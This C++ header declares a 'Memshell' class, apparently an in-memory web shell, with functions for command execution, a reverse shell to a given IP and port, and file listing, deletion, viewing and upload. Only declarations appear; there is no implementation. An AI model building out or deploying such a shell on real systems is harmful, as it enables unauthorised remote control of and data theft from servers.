#ifndef _MEM_SHELL_H_
#define _MEM_SHELL_H_

#include <string>

class Memshell
{
private:
    /* data */
public:
    static std::string exec(const char * cmd);
    static std::string reverse_shell(const char * ip, int port);
    static std::string help();
    static std::string list(const char * path);
    static std::string delet(const char * path);
    static std::string showfile(const char * path);
    static std::string upload(const char * path, const std::string & content, char type);
};

#endif
